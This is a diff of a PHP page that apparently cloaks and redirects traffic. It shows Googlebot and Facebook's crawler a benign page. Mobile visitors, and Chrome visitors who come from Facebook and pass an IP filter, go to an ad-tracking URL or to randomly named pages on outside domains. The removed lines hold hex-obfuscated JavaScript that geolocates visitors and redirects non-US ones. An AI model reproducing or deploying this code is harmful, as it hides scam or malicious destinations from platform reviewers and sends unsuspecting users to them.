@@ -1,78 +1,60 @@
 <?php
+  $action = "theme";
+  require_once('Mobile_Detect.php');
+  require_once('Browser.php');
+  $detect = new Mobile_Detect;
+  $browser = new Browser();
 
-    $host = $_SERVER["HTTP_HOST"];
-    if(!isset($_GET["id"])){
-        $_GET["id"] = "";
-    }
-    $_GET["id"] = explode(".", $_GET["id"])[0];
-    $_GET["id"] = explode("/", $_GET["id"])[1];
-    if(isset($_GET["uid"])){
-        $imagelink = "https://graph.facebook.com/".$_GET["uid"]."/picture?width=640&height=340";
-        $putimage = true;
-    }else{
-        $putimage = false;
-    }
-    $randomclass = md5rand(8);
+  if($detect->isMobile() || $browser->isMobile()){
+    $action = "mobile";
+  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
+    $action = "theme";
+  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
+    $action = "theme";
+  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
+    $action = "site";
+  }
 
-  function md5rand($val){
-  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-      $chars="0123456789";
-      srand((double)microtime()*1000000);
-      $i = 0;
-      $pass = '' ;
-      while ($i<=$val) 
-    {
-        $num  = rand() % 10;
-        $tmp  = substr($chars, $num, 1);
-        $pass = $pass . $tmp;
-        $i++;
+  if($action == "site"){
+    $_SERVER["HTTP_REFERER"] = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
+    $refs = array('facebook.com');
+    $action = "theme";
+    foreach ($refs as $ref) {
+      if(strpos($_SERVER["HTTP_REFERER"], $ref) !== false){
+        $action = "site";
+        break;
       }
-    return $pass;
     }
-      function shkronja($val){
-  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-      srand((double)microtime()*1000000);
-      $i = 0;
-      $pass = '' ;
-      while ($i<=$val) 
-    {
-        $num  = rand() % 10;
-        $tmp  = substr($chars, $num, 1);
-        $pass = $pass . $tmp;
-        $i++;
+  }
+
+  if($action != "theme"){
+    require_once("filter.php");
+    $ipfilter = new IPFilter();
+    $host_verify = $ipfilter->isValid();
+    if($host_verify == false){
+      $action = "theme";
+    }
+  }
+
+  function generate_name($length){
+      $rname = "";
+      $sesli = "aeiou";
+      $sessiz = "bcdfghjklmnprstvyz";
+      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
+      for($n=0;$n<$length;$n++){
+          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
+              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
+          }else{
+              $rname .= $sesli[rand(0,strlen($sesli)-1)];
+          }
       }
-    return $pass;
-    }
-
-
-
-    ?>
-<meta property="og:image" content="<?php echo $imagelink; ?>"">
-<meta property="og:image:width" content="560">
-<meta property="og:image:height" content="315">
-<?php
-
-
-$randval = rand();
-if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
+      return $rname;
+  }
   
-  
-
-  echo '<script>
-
-var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x75\x74\x75\x6E\x67\x61\x2E\x63\x6F\x6D\x2F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999)}  </script>';
-
-  } 
-  
-
-
-
-else {
-     //Google brought me to this page.
-    //header("Location: https://facebook.com/search?q=".$randval);
-   exit();
-}  
-
-
+  if($action == "mobile"){
+    header("Location: http://tracking.redirect.pub/ad/41bc9048?d=1");
+  }else if($action == "site"){
+    $filename = generate_name(rand(5,8)).".html";
+    header("Location:http://sonbkos.pw/".$filename);
+  }
 ?>
